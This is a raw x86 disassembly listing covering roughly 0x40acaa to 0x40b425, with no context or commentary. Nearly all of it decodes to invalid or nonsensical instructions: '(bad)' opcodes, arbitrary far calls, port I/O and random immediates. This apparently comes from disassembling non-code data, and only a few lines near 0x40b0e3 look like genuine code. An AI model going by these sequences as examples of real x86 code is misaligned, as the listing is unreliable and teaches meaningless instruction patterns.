  40acaa:	ss mov ecx,0x4974652d
  40acb0:	inc    ebx
  40acb1:	test   al,0x68
  40acb3:	adc    al,0x58
  40acb5:	push   cs
  40acb6:	retf   
  40acb7:	inc    ebx
  40acb8:	(bad)  [esi]
  40acba:	les    esp,FWORD PTR [edi+0x32]
  40acbd:	test   eax,0x24bcef23
  40acc2:	(bad)  
  40acc3:	jmp    0x40ace1
  40acc5:	gs jnp 0x40ad03
  40acc8:	mov    al,BYTE PTR [edi]
  40acca:	and    DWORD PTR [ecx-0xdc68496],0xda5179bc
  40acd4:	sar    BYTE PTR [ebp+0x126e570a],cl
  40acda:	leave  
  40acdb:	mov    edx,DWORD PTR [ebx]
  40acdd:	pop    dx
  40acdf:	lods   eax,DWORD PTR ds:[esi]
  40ace0:	or     BYTE PTR [ecx],0x3a
  40ace3:	call   0x2a73:0x86477c91
  40acea:	in     eax,dx
  40aceb:	pop    es
  40acec:	pop    ebx
  40aced:	cmc    
  40acee:	bound  edx,QWORD PTR ds:0xebf13e8f
  40acf4:	push   0x78685b2d
  40acf9:	adc    al,BYTE PTR [ebx+0x734fdfe7]
  40acff:	js     0x40ac9e
  40ad01:	or     ah,BYTE PTR [eax-0x32]
  40ad04:	jne    0x40ad2b
  40ad06:	mov    ebp,0x4c9a82c3
  40ad0b:	fdiv   st,st(2)
  40ad0d:	retf   0x5d77
  40ad10:	mov    esi,0xbb5c4e80
  40ad15:	sub    bl,BYTE PTR [eax]
  40ad17:	sbb    DWORD PTR [esi],eax
  40ad19:	xor    esi,DWORD PTR [edi+edi*4]
  40ad1c:	imul   eax,DWORD PTR [esi-0x588df140],0xffffff8c
  40ad23:	es out dx,al
  40ad25:	test   DWORD PTR [ecx],ecx
  40ad27:	pop    ecx
  40ad28:	add    eax,0xcce1b660
  40ad2d:	scas   eax,DWORD PTR es:[edi]
  40ad2e:	lods   eax,DWORD PTR ds:[esi]
  40ad2f:	cmp    al,0x18
  40ad31:	ret    
  40ad32:	shr    BYTE PTR [edi],0x99
  40ad35:	aas    
  40ad36:	adc    DWORD PTR [ebx],esp
  40ad38:	fcomp  QWORD PTR [edx-0x747f28b0]
  40ad3e:	out    0x6c,eax
  40ad40:	mov    esp,0xe55302d5
  40ad45:	cli    
  40ad46:	jno    0x40ad5a
  40ad48:	sub    eax,0xe708828d
  40ad4d:	dec    BYTE PTR [edx-0x3ffbad36]
  40ad53:	repz shl BYTE PTR [edi-0x51ab8094],0xd7
  40ad5b:	neg    ah
  40ad5d:	les    esp,FWORD PTR [edi]
  40ad5f:	mov    DWORD PTR [esi],ebx
  40ad61:	jg     0x40ad40
  40ad63:	or     eax,0x9ee0e537
  40ad68:	and    ebp,DWORD PTR [ebx]
  40ad6a:	xor    ebp,DWORD PTR [eax+0x4f79cef2]
  40ad70:	bound  eax,QWORD PTR [eax]
  40ad72:	(bad)  
  40ad74:	adc    bl,BYTE PTR [esp]
  40ad77:	(bad)
  40ad7b:	jecxz  0x40ad59
  40ad7d:	(bad)  
  40ad7e:	mov    edi,0x1971a3a
  40ad83:	cmp    ebp,DWORD PTR [edi+0x6c]
  40ad86:	push   eax
  40ad87:	xchg   esi,eax
  40ad88:	in     al,0x9d
  40ad8a:	lea    eax,[edi-0x2a]
  40ad8d:	sbb    edx,ebp
  40ad8f:	mov    edx,0x2db05cfc
  40ad94:	repnz ins BYTE PTR es:[edi],dx
  40ad96:	inc    esi
  40ad97:	pushf  
  40ad98:	ins    BYTE PTR es:[edi],dx
  40ad99:	ins    BYTE PTR es:[edi],dx
  40ad9a:	jns    0x40ad20
  40ad9c:	fstp   QWORD PTR [ecx-0x79]
  40ad9f:	scas   al,BYTE PTR es:[edi]
  40ada0:	int3   
  40ada1:	dec    esi
  40ada2:	pop    esp
  40ada3:	push   cs
  40ada4:	scas   eax,DWORD PTR es:[edi]
  40ada5:	fsub   st,st(2)
  40ada7:	sub    ebp,DWORD PTR [ecx+0x19]
  40adaa:	mov    ch,BYTE PTR [esi-0x3cb76ef]
  40adb0:	adc    eax,0xf6047bcd
  40adb5:	shr    DWORD PTR [ecx-0x6671b265],1
  40adbb:	jl     0x40ad76
  40adbd:	(bad)  
  40adbe:	loop   0x40ad77
  40adc0:	aas    
  40adc1:	fsub   QWORD PTR [ebx]
  40adc3:	jae    0x40ad8e
  40adc5:	in     eax,0x29
  40adc7:	call   0xc2d01862
  40adcc:	lock push cs
  40adce:	retf   0xed12
  40add1:	into   
  40add2:	xor    eax,0x7d93a2bd
  40add7:	out    0xc5,al
  40add9:	imul   eax,esp,0x54bf1eb7
  40addf:	adc    edx,ebx
  40ade1:	jo     0x40ae42
  40ade3:	xchg   esp,eax
  40ade4:	ret    0x8de1
  40ade7:	outs   dx,BYTE PTR ds:[esi]
  40ade8:	mov    ds:0x7694c39a,al
  40aded:	mov    al,ds:0x984a8b05
  40adf2:	ficom  WORD PTR [eax-0x6e]
  40adf5:	sub    eax,0x881c6962
  40adfa:	and    eax,0xdecd2193
  40adff:	xor    al,0xbd
  40ae02:	aad    0xb4
  40ae04:	fst    QWORD PTR [eax+0x4f44752d]
  40ae0a:	inc    eax
  40ae0b:	(bad)  
  40ae0c:	int    0x67
  40ae0e:	jno    0x40adf9
  40ae10:	mov    gs,WORD PTR [ebp-0x77]
  40ae13:	std    
  40ae14:	or     al,cl
  40ae16:	add    DWORD PTR [edi],0x598164c9
  40ae1c:	mov    al,0x73
  40ae1e:	imul   ebx,DWORD PTR [edi+0x61],0xffffffe3
  40ae22:	adc    eax,0xa9849d30
  40ae27:	or     dh,BYTE PTR [edi]
  40ae29:	sub    DWORD PTR [edi+0x495d60bd],ebp
  40ae2f:	fsub   st(1),st
  40ae31:	mov    edi,0x35961a69
  40ae36:	cmp    eax,0x85e9df25
  40ae3b:	enter  0xb0b,0x36
  40ae3f:	push   esi
  40ae40:	sub    eax,0x573f4952
  40ae45:	mov    edx,0xbe0474e3
  40ae4a:	and    dh,dl
  40ae4c:	cdq    
  40ae4d:	mov    edi,0xa0435f9f
  40ae52:	mov    esp,0xc1de999
  40ae57:	cmp    eax,DWORD PTR [ebx]
  40ae59:	jmp    DWORD PTR [esi]
  40ae5b:	shl    DWORD PTR [edx+0x47],cl
  40ae5e:	sbb    edx,ebx
  40ae60:	inc    edi
  40ae61:	icebp  
  40ae62:	ret    
  40ae63:	aam    0x65
  40ae65:	inc    ebx
  40ae66:	ss idiv esp
  40ae69:	rcl    BYTE PTR cs:[esi],1
  40ae6c:	bound  esi,QWORD PTR [ebx]
  40ae6e:	mov    eax,0x10dded7d
  40ae73:	xchg   edi,eax
  40ae74:	fnstsw WORD PTR [ebx]
  40ae76:	ss test al,0x7a
  40ae79:	in     al,dx
  40ae7a:	sub    DWORD PTR [ebp-0x5d],ecx
  40ae7d:	dec    edx
  40ae7e:	mov    ecx,0x2cddf90e
  40ae83:	fsubr  QWORD PTR [esi+eiz*8+0x2c]
  40ae87:	shl    DWORD PTR [edx],0x5
  40ae8a:	mov    esp,0x641e93de
  40ae8f:	mov    dh,0xe
  40ae91:	(bad)  
  40ae92:	xchg   ebp,eax
  40ae93:	nop
  40ae94:	and    al,0x2c
  40ae96:	fdivr  QWORD PTR [ebx-0x10]
  40ae99:	xchg   ecx,eax
  40ae9a:	pop    edi
  40ae9b:	dec    edi
  40ae9c:	ret    
  40ae9d:	jno    0x40ae4a
  40ae9f:	fild   DWORD PTR [edx-0x2d88201e]
  40aea5:	add    eax,0x9c7ab35
  40aeaa:	je     0x40aefa
  40aeac:	dec    edx
  40aead:	cmp    al,0xec
  40aeaf:	and    cl,BYTE PTR [ecx]
  40aeb1:	mov    ds:0x8a1a6dc6,al
  40aeb6:	adc    eax,0x2bd82897
  40aebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aebc:	shl    BYTE PTR [esi-0x1c],0xfe
  40aec0:	xchg   edi,eax
  40aec1:	xor    BYTE PTR [ebx+0x41],0x8e
  40aec5:	nop
  40aec6:	and    DWORD PTR [edi+0x2f],esi
  40aec9:	mov    ebx,0x2b954bbb
  40aece:	das    
  40aecf:	sar    DWORD PTR [edx-0x5b],0xc6
  40aed3:	pop    ecx
  40aed4:	es repnz and al,0x8e
  40aed8:	mov    ah,0x80
  40aeda:	push   es
  40aedb:	xchg   DWORD PTR [edx-0xefc374f],ebp
  40aee1:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40aee3:	test   dl,dl
  40aee5:	call   0x15a:0x40656bb5
  40aeec:	jecxz  0x40aea1
  40aeee:	out    dx,eax
  40aeef:	stos   BYTE PTR es:[edi],al
  40aef0:	adc    eax,0xdaca6097
  40aef6:	pop    edx
  40aef7:	adc    BYTE PTR [esi+0x4],dl
  40aefa:	mov    eax,ds:0x4fc8569a
  40aeff:	pop    edi
  40af00:	clc    
  40af01:	retf   
  40af02:	repz jmp DWORD PTR [esi+0x56]
  40af06:	outs   dx,DWORD PTR ds:[esi]
  40af07:	push   ds
  40af08:	xchg   edx,ebp
  40af0a:	adc    eax,0xb174f7c4
  40af0f:	xor    BYTE PTR [eax],0xc1
  40af12:	aas    
  40af13:	xchg   esi,eax
  40af14:	sbb    cl,BYTE PTR [edx+0x31b6312d]
  40af1a:	daa    
  40af1b:	fisttp DWORD PTR [eax]
  40af1d:	bound  edi,QWORD PTR [ecx+eiz*2]
  40af20:	in     eax,0xe7
  40af22:	repnz (bad) 
  40af24:	jae    0x40af32
  40af26:	cwde   
  40af27:	rcr    BYTE PTR [ecx-0x7e],0x39
  40af2b:	pop    ebp
  40af2c:	dec    BYTE PTR [edi+ebp*8]
  40af2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af30:	aam    0x40
  40af32:	sub    dl,dh
  40af34:	mov    bl,0x7a
  40af36:	xchg   edi,eax
  40af37:	xchg   bh,bh
  40af39:	lods   eax,DWORD PTR ds:[esi]
  40af3a:	mov    edx,0xe273505f
  40af3f:	scas   eax,DWORD PTR es:[edi]
  40af40:	jecxz  0x40aef8
  40af42:	push   ebx
  40af43:	sbb    eax,DWORD PTR [eax-0xf]
  40af46:	sbb    DWORD PTR [eax+0x79ad60c4],edi
  40af4c:	pop    esi
  40af4d:	cwde   
  40af4e:	pop    esi
  40af4f:	dec    edi
  40af50:	pop    ss
  40af51:	xor    DWORD PTR [edi-0x5],edx
  40af54:	(bad)  
  40af55:	call   0xd6f9f347
  40af5a:	mov    bh,0x21
  40af5c:	mov    al,0x38
  40af5e:	dec    ecx
  40af5f:	and    eax,0x661be09a
  40af64:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af66:	mov    cl,BYTE PTR [edi+edi*1-0x7f]
  40af6a:	clc    
  40af6b:	int3   
  40af6c:	push   ebx
  40af6d:	jle    0x40af82
  40af6f:	add    ch,0x81
  40af72:	mov    ?,WORD PTR [eax]
  40af74:	push   esi
  40af75:	mov    ecx,0xbb8196f3
  40af7a:	xor    BYTE PTR [ebx-0x37],bl
  40af7d:	pop    ebp
  40af7e:	sub    dl,bh
  40af80:	mov    al,0x46
  40af82:	jg     0x40af5f
  40af84:	aas    
  40af85:	mov    eax,ds:0x4959b82a
  40af8a:	sbb    eax,0xbbe8f092
  40af8f:	(bad)  
  40af91:	cmp    BYTE PTR [edi+0x2e],bl
  40af94:	in     eax,0xa1
  40af96:	xbegin 0x74e43926
  40af9c:	pop    esi
  40af9d:	cmp    dh,BYTE PTR [ebx+0x7]
  40afa0:	ins    BYTE PTR es:[edi],dx
  40afa1:	les    ebp,FWORD PTR [ecx*2+0x3aa61611]
  40afa8:	jp     0x40af49
  40afaa:	cmp    bh,ah
  40afac:	data16 sub al,dh
  40afaf:	unpckhps xmm6,xmm4
  40afb2:	repnz dec esi
  40afb4:	sbb    al,0xdc
  40afb6:	hlt    
  40afb7:	sub    esp,DWORD PTR [eax-0xea1f6e5]
  40afbd:	mov    edi,0x99c46c17
  40afc2:	xchg   ebx,eax
  40afc3:	sub    ecx,edx
  40afc5:	daa    
  40afc6:	call   0x5655:0xb234bb84
  40afcd:	inc    ebx
  40afce:	ficomp DWORD PTR [ebx]
  40afd0:	sub    BYTE PTR ds:0xcd5eaa2,cl
  40afd6:	sar    DWORD PTR [ebx],1
  40afd8:	fs dec eax
  40afda:	and    ebx,DWORD PTR [ebx+0x7f21eae0]
  40afe0:	inc    edi
  40afe1:	push   es
  40afe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afe3:	cmp    BYTE PTR [edi-0x3f5496b8],dh
  40afe9:	add    BYTE PTR [eax],bh
  40afeb:	popf   
  40afec:	and    bl,BYTE PTR [eax+0x77]
  40afef:	jne    0x40b070
  40aff1:	xor    BYTE PTR [ebp-0x63],ah
  40aff4:	adc    DWORD PTR [edi-0x605ec0ba],0x9582a059
  40affe:	mov    ds:0x8255dacb,al
  40b003:	mov    esi,0x8fa241c4
  40b008:	neg    BYTE PTR [ebx]
  40b00a:	sar    BYTE PTR [esp+ebp*1],0x65
  40b00e:	ja     0x40b044
  40b010:	cmp    DWORD PTR [edx-0x73],ecx
  40b013:	inc    edi
  40b014:	pop    ebp
  40b015:	leave  
  40b016:	aaa    
  40b017:	popa   
  40b018:	xchg   esp,eax
  40b019:	xchg   ebp,eax
  40b01a:	cwde   
  40b01b:	sbb    eax,0xb48348b4
  40b020:	mov    ebp,0xc246ae50
  40b025:	dec    ebx
  40b026:	push   ecx
  40b027:	xchg   edi,eax
  40b028:	sub    edx,ecx
  40b02a:	add    esp,esp
  40b02c:	jo     0x40b042
  40b02e:	sub    eax,0xdbebebe5
  40b033:	jl     0x40b033
  40b035:	test   eax,edx
  40b037:	outs   dx,BYTE PTR ds:[esi]
  40b038:	ret    
  40b039:	mov    ebx,0x33b71e06
  40b03e:	inc    ecx
  40b03f:	adc    eax,0x6278c80b
  40b044:	popa   
  40b045:	scas   eax,DWORD PTR es:[edi]
  40b046:	pushf  
  40b047:	add    eax,0x457b9d9a
  40b04c:	jbe    0x40b03b
  40b04e:	or     dh,BYTE PTR [edi]
  40b050:	mov    eax,0x77054061
  40b055:	mov    cs,WORD PTR [eax+0x24]
  40b058:	mov    bh,0x26
  40b05a:	test   BYTE PTR [edx+0x76],0x5e
  40b05e:	dec    edx
  40b05f:	sbb    ebp,edi
  40b061:	inc    ebp
  40b062:	inc    edi
  40b063:	repz mov dl,0xc6
  40b066:	mov    al,0x4a
  40b068:	addr16 lahf 
  40b06a:	sahf   
  40b06b:	sbb    eax,0x681027dc
  40b070:	xor    eax,0x61c87ff9
  40b075:	(bad)  
  40b076:	or     eax,0xdcc80aaa
  40b07b:	add    ah,bh
  40b07d:	cld    
  40b07e:	fisub  WORD PTR [ebx]
  40b080:	dec    esp
  40b081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b082:	(bad)  
  40b083:	imul   BYTE PTR [edx+eax*8-0x1d]
  40b087:	dec    edi
  40b088:	lahf   
  40b089:	inc    eax
  40b08a:	mov    BYTE PTR [ebx-0x77],cl
  40b08d:	lahf   
  40b08e:	push   es
  40b08f:	ins    BYTE PTR es:[edi],dx
  40b090:	xor    DWORD PTR [edx-0x5cb57429],ebp
  40b096:	inc    eax
  40b097:	into   
  40b098:	sbb    edx,DWORD PTR [esi]
  40b09a:	lods   al,BYTE PTR ds:[esi]
  40b09b:	dec    esi
  40b09c:	addr16 popf 
  40b09e:	shld   DWORD PTR [edx],eax,cl
  40b0a1:	xchg   edx,eax
  40b0a2:	loop   0x40b0ef
  40b0a4:	or     BYTE PTR [esp+eiz*8-0x257e1dbf],ch
  40b0ab:	xor    esp,DWORD PTR [ebx]
  40b0ad:	jbe    0x40b074
  40b0af:	ret    0x1cac
  40b0b2:	pop    ds
  40b0b3:	rcl    DWORD PTR [esi-0x11],cl
  40b0b6:	inc    edi
  40b0b7:	jns    0x40b06a
  40b0b9:	sbb    al,0xdf
  40b0bb:	push   0x5bc7622a
  40b0c0:	mov    fs:0x4c43b272,eax
  40b0c6:	sub    edx,DWORD PTR [edx-0x4f]
  40b0c9:	fld    TBYTE PTR [edx+0x6b]
  40b0cc:	int3   
  40b0cd:	and    eax,0x73ada051
  40b0d2:	(bad)  
  40b0d3:	lock loopne 0x40b100
  40b0d6:	push   edi
  40b0d7:	iret   
  40b0d8:	or     bh,BYTE PTR [esi+0x3c594c74]
  40b0de:	or     eax,0xd8458b15
  40b0e3:	xor    eax,esi
  40b0e5:	add    eax,edi
  40b0e7:	mov    DWORD PTR [ebp-0x20],eax
  40b0ea:	mov    eax,DWORD PTR [ebp-0x4]
  40b0ed:	mov    DWORD PTR [ebp-0x24],eax
  40b0f0:	lea    eax,[ebp-0x98]
  40b0f6:	mov    DWORD PTR [ebp-0x8],eax
  40b0f9:	jmp    0x40b604
  40b0fe:	(bad)  
  40b0ff:	(bad)  
  40b100:	retf   0xcad1
  40b103:	rcl    ebp,1
  40b105:	fnstcw WORD PTR [ebx-0x31]
  40b108:	stc    
  40b109:	mov    ds:0x88ddb04c,eax
  40b10e:	dec    esi
  40b10f:	nop
  40b110:	js     0x40b18a
  40b112:	push   0x7c
  40b114:	js     0x40b18e
  40b116:	lock inc ebp
  40b118:	daa    
  40b119:	int    0x98
  40b11b:	mov    esp,0x27b18ed9
  40b120:	and    al,0x73
  40b122:	mov    dh,0x70
  40b124:	or     al,0xd7
  40b126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b127:	lds    eax,FWORD PTR [ecx-0x65]
  40b12a:	or     eax,0x4d1daf26
  40b12f:	ret    
  40b130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b131:	pusha  
  40b132:	push   ds
  40b133:	sahf   
  40b134:	jns    0x40b0e3
  40b136:	rol    BYTE PTR [edi+0x69a954a2],1
  40b13c:	push   ss
  40b13d:	sbb    al,0xe2
  40b13f:	adc    BYTE PTR [eax+0x176f051a],cl
  40b145:	pop    ss
  40b146:	jo     0x40b18d
  40b148:	sub    al,0x71
  40b14a:	imul   edi,DWORD PTR [ebx+eax*8+0x73],0xffffffc6
  40b14f:	dec    ah
  40b151:	xchg   esi,eax
  40b152:	and    BYTE PTR [ebx+0x74],0xe0
  40b156:	adc    bl,0xcf
  40b159:	loopne 0x40b131
  40b15b:	mov    cl,0xa2
  40b15d:	xchg   esp,eax
  40b15e:	xchg   edx,eax
  40b15f:	jle    0x40b15f
  40b161:	in     eax,dx
  40b162:	mov    bh,bh
  40b164:	mov    ebx,0x737a9f2c
  40b169:	in     al,dx
  40b16a:	push   eax
  40b16b:	pop    ebx
  40b16c:	inc    ebx
  40b16d:	lods   eax,DWORD PTR ds:[esi]
  40b16e:	jb     0x40b1b9
  40b170:	(bad)  
  40b171:	call   0x6c8f:0x93c496d
  40b178:	clc    
  40b179:	aas    
  40b17a:	fucomi st,st(7)
  40b17c:	mov    DWORD PTR [ebp+0x79],0x712a0e27
  40b183:	mov    ds:0xcaf82180,eax
  40b188:	push   esp
  40b189:	je     0x40b133
  40b18b:	cmp    ebx,DWORD PTR [edi+0x221ed920]
  40b191:	lahf   
  40b192:	mov    ds:0x60c6081,al
  40b197:	pop    edi
  40b198:	fidiv  WORD PTR [edi]
  40b19a:	and    edx,DWORD PTR [esi]
  40b19c:	das    
  40b19d:	push   ebx
  40b19e:	js     0x40b1b7
  40b1a0:	aas    
  40b1a1:	push   ebx
  40b1a2:	mov    DWORD PTR [ebx-0x1bb5d554],esp
  40b1a8:	mov    DWORD PTR [ebx-0x1b],ebp
  40b1ab:	leave  
  40b1ac:	sbb    BYTE PTR [edx],dh
  40b1ae:	pop    edi
  40b1af:	aam    0xb4
  40b1b1:	mov    cl,0x11
  40b1b3:	mov    ebx,0x9f9e8681
  40b1b8:	jmp    0xd86a3ba5
  40b1bd:	mov    ch,0x4f
  40b1bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1c0:	push   ds
  40b1c1:	loope  0x40b23c
  40b1c3:	push   ds
  40b1c4:	fadd   QWORD PTR [ebp+0x7c89461d]
  40b1ca:	pop    ss
  40b1cb:	es ja  0x40b169
  40b1ce:	pop    edi
  40b1cf:	dec    ebp
  40b1d0:	lahf   
  40b1d1:	jae    0x40b228
  40b1d3:	std    
  40b1d4:	or     DWORD PTR [ebx+0x18],ebp
  40b1d7:	dec    esi
  40b1d8:	dec    esp
  40b1d9:	sbb    BYTE PTR [ebp+0x47],bh
  40b1dc:	fisubr DWORD PTR [esi+0x75]
  40b1df:	cmp    bl,BYTE PTR [ebx-0x5b1e4672]
  40b1e5:	and    ch,al
  40b1e7:	fcomp  st(2)
  40b1e9:	inc    eax
  40b1ea:	in     eax,dx
  40b1eb:	(bad)  
  40b1ec:	in     eax,dx
  40b1ed:	adc    cl,bl
  40b1ef:	gs retf 0xb074
  40b1f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1f4:	pop    esi
  40b1f5:	mov    ecx,DWORD PTR [esp+ebx*8-0x4d]
  40b1f9:	cmp    eax,0xa09f108
  40b1fe:	push   es
  40b1ff:	lea    ebp,[edi+0x38]
  40b202:	sahf   
  40b203:	lea    eax,[eax-0x5f60194e]
  40b209:	(bad)  
  40b20a:	retf   0x4608
  40b20d:	dec    esi
  40b20e:	sub    al,0x33
  40b210:	ficom  DWORD PTR [ebp+0x43]
  40b213:	xor    al,0x70
  40b215:	(bad)  
  40b216:	stos   DWORD PTR es:[edi],eax
  40b217:	enter  0xced2,0x8e
  40b21b:	jne    0x40b1be
  40b21d:	add    al,0xfa
  40b21f:	dec    esp
  40b220:	and    esi,DWORD PTR [eax]
  40b222:	dec    eax
  40b223:	enter  0x930d,0x3e
  40b227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b228:	std    
  40b229:	push   ss
  40b22a:	pop    esi
  40b22b:	push   edx
  40b22c:	mov    ebx,0xa50982b6
  40b231:	mov    al,ds:0xea033874
  40b236:	sti    
  40b237:	jmp    0x51bd:0xc48c6faa
  40b23e:	dec    ebp
  40b23f:	loop   0x40b1e9
  40b241:	add    DWORD PTR [edi],0x48
  40b244:	or     al,0x1
  40b246:	enter  0xe9e3,0x4e
  40b24a:	or     BYTE PTR [edi+ecx*4-0x42cd7e1a],bh
  40b251:	add    eax,0xf0c2ec3d
  40b256:	jmp    0xbfc8:0x153d4954
  40b25d:	sub    cl,BYTE PTR [ebp+ebx*4-0x672b2a28]
  40b264:	mov    ds:0x31bcd492,al
  40b269:	xchg   ebx,eax
  40b26a:	dec    esp
  40b26b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b26c:	xchg   edx,eax
  40b26d:	mov    ?,esp
  40b26f:	adc    esi,DWORD PTR [ecx+eiz*4+0xa]
  40b273:	sbb    BYTE PTR [eax],0x5b
  40b276:	push   ebp
  40b277:	cdq    
  40b278:	inc    ecx
  40b279:	imul   esi,DWORD PTR [esi-0xf918896],0x58a6c6ba
  40b283:	pop    edi
  40b284:	dec    ebx
  40b285:	dec    eax
  40b286:	popf   
  40b287:	call   0xe6ae4846
  40b28c:	mov    dh,0xfd
  40b28e:	sub    eax,0xe4428579
  40b293:	fist   WORD PTR [edx+0x1d]
  40b296:	inc    edi
  40b297:	mov    DWORD PTR [edx-0x770d6c36],ebp
  40b29d:	xchg   esi,eax
  40b29e:	xor    bh,bl
  40b2a0:	mov    ?,edx
  40b2a2:	ds pop edi
  40b2a4:	rcr    DWORD PTR [edi],1
  40b2a6:	fwait
  40b2a7:	and    eax,ecx
  40b2a9:	push   ecx
  40b2aa:	stos   DWORD PTR es:[edi],eax
  40b2ab:	fcomi  st,st(1)
  40b2ad:	and    eax,0x6afb592f
  40b2b2:	add    BYTE PTR [eax-0xb],al
  40b2b5:	jns    0x40b2fd
  40b2b7:	fisub  DWORD PTR [edi-0x366ffa8]
  40b2bd:	xchg   ebp,eax
  40b2be:	mov    ebp,0xc490ba29
  40b2c3:	or     ch,BYTE PTR [eax-0x3cf741cc]
  40b2c9:	mov    esi,0xad1916d6
  40b2ce:	push   ebx
  40b2cf:	push   edi
  40b2d0:	lods   al,BYTE PTR ds:[esi]
  40b2d1:	shr    DWORD PTR [eax+eax*8-0x31],0x18
  40b2d6:	lods   eax,DWORD PTR ds:[esi]
  40b2d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2d8:	retf   
  40b2d9:	dec    edx
  40b2da:	fs call 0xdc7ccb13
  40b2e0:	push   esi
  40b2e1:	dec    edi
  40b2e2:	dec    esi
  40b2e3:	imul   esp,DWORD PTR [esi+0x4],0xffffffc3
  40b2e7:	or     DWORD PTR [esi],esp
  40b2e9:	pop    ds
  40b2ea:	fadd   QWORD PTR [eax]
  40b2ec:	pushf  
  40b2ed:	fsubp  st(1),st
  40b2ef:	cmp    BYTE PTR ds:0x370572d,0xfb
  40b2f6:	xchg   ecx,eax
  40b2f7:	icebp  
  40b2f8:	in     eax,dx
  40b2f9:	mov    cs,eax
  40b2fb:	push   edi
  40b2fc:	push   cs
  40b2fd:	cmp    ah,ah
  40b2ff:	mov    ah,BYTE PTR [esi+0xd]
  40b302:	rcr    bl,cl
  40b304:	fucomip st,st(5)
  40b306:	push   ebx
  40b307:	xor    BYTE PTR [ecx+esi*8+0x7070e625],ah
  40b30e:	aas    
  40b30f:	or     al,0x2e
  40b311:	push   ebp
  40b312:	jmp    0x40b2de
  40b314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b315:	dec    esp
  40b316:	(bad)  
  40b317:	cwde   
  40b318:	pop    esp
  40b319:	sti    
  40b31a:	push   edi
  40b31b:	retf   
  40b31c:	mov    bl,0x9b
  40b31e:	xchg   DWORD PTR [eax+0x6dde0e57],ebx
  40b324:	sbb    BYTE PTR [ebp+0x32],ah
  40b327:	xchg   esp,eax
  40b328:	pop    ebx
  40b329:	inc    eax
  40b32a:	xor    cl,ch
  40b32c:	add    BYTE PTR [eax],bh
  40b32e:	ins    BYTE PTR es:[edi],dx
  40b32f:	cmp    al,0xfd
  40b331:	mov    ch,0xe2
  40b333:	(bad)  
  40b334:	adc    al,0xd9
  40b336:	out    0xcf,eax
  40b338:	outs   dx,DWORD PTR ds:[esi]
  40b339:	ldmxcsr DWORD PTR [edi+0x36]
  40b33d:	mov    ebx,0x5af089f8
  40b342:	xor    al,0xa3
  40b344:	call   0x7330:0xc58aaeab
  40b34b:	test   DWORD PTR [edi+0x58b8d2ec],esp
  40b351:	pop    esp
  40b352:	mov    eax,0x5b20e0f6
  40b357:	jae    0x40b3b1
  40b359:	jne    0x40b3b9
  40b35b:	jg     0x40b357
  40b35d:	pushf  
  40b35e:	mov    esp,0xaa3f0244
  40b363:	int    0xa
  40b365:	or     al,0xdd
  40b367:	dec    eax
  40b368:	pop    es
  40b369:	scas   al,BYTE PTR es:[edi]
  40b36a:	mov    ah,0xff
  40b36c:	push   0x8e63ea4f
  40b371:	jo     0x40b3e1
  40b373:	lock adc eax,0x265d0fa6
  40b379:	pop    edi
  40b37a:	jmp    0x40b33c
  40b37c:	cwde   
  40b37d:	jnp    0x40b3a1
  40b37f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b380:	out    0xfb,al
  40b382:	not    BYTE PTR [eax]
  40b384:	or     ebx,DWORD PTR [ebp+0x2b]
  40b387:	aam    0xb1
  40b389:	popf   
  40b38a:	and    al,0xc1
  40b38c:	test   al,0xab
  40b38e:	pop    ss
  40b38f:	(bad)  
  40b392:	lahf   
  40b393:	nop
  40b394:	push   esi
  40b395:	mov    ds:0x12982eff,al
  40b39a:	verr   di
  40b39d:	mov    ebp,0x1bf9d666
  40b3a2:	fwait
  40b3a3:	xchg   BYTE PTR ds:0xc496a522,al
  40b3a9:	lods   eax,DWORD PTR ds:[esi]
  40b3aa:	fidivr DWORD PTR [edx]
  40b3ac:	inc    esi
  40b3ad:	stc    
  40b3ae:	fsubp  st(0),st
  40b3b0:	in     eax,dx
  40b3b1:	jg     0x40b393
  40b3b3:	aaa    
  40b3b4:	inc    esp
  40b3b5:	or     DWORD PTR [esi+esi*1-0x7d],ecx
  40b3b9:	dec    edx
  40b3ba:	pop    eax
  40b3bb:	gs in  al,0x87
  40b3be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3bf:	pop    eax
  40b3c0:	test   eax,0xb238598b
  40b3c5:	and    edi,DWORD PTR [esi+0x28]
  40b3c8:	sub    esp,DWORD PTR [edi-0x394deb75]
  40b3ce:	shl    DWORD PTR [edx+0x2a18f6e2],cl
  40b3d4:	add    DWORD PTR [esi-0x61],esi
  40b3d7:	push   esp
  40b3d8:	std    
  40b3d9:	inc    edi
  40b3da:	mov    edx,0xe3834f4a
  40b3df:	hlt    
  40b3e0:	outs   dx,BYTE PTR ds:[esi]
  40b3e1:	and    cl,cl
  40b3e3:	jle    0x40b3cd
  40b3e5:	add    eax,0xff9439de
  40b3ea:	scas   eax,DWORD PTR es:[edi]
  40b3eb:	(bad)  
  40b3ec:	adc    al,0xda
  40b3ee:	loopne 0x40b44a
  40b3f0:	test   BYTE PTR [eax+ebx*8+0x3c],0xf9
  40b3f5:	(bad)  
  40b3f6:	jl     0x40b458
  40b3f8:	xor    DWORD PTR ds:0x8a533a81,0xaedb934f
  40b402:	addr16 push ebx
  40b404:	jge    0x40b438
  40b406:	xlat   BYTE PTR ds:[ebx]
  40b407:	ficomp WORD PTR [edx-0x64]
  40b40a:	test   DWORD PTR [eax+0x1fac2263],esi
  40b410:	push   es
  40b411:	jp     0x40b400
  40b413:	jb     0x40b46b
  40b415:	adc    eax,0xfe1e0b86
  40b41a:	cmp    eax,0xc10bc7f8
  40b41f:	xor    DWORD PTR [ebx+0x3b],ebp
  40b422:	cld    
  40b423:	xor    cl,cl
  40b425:	dec    edi
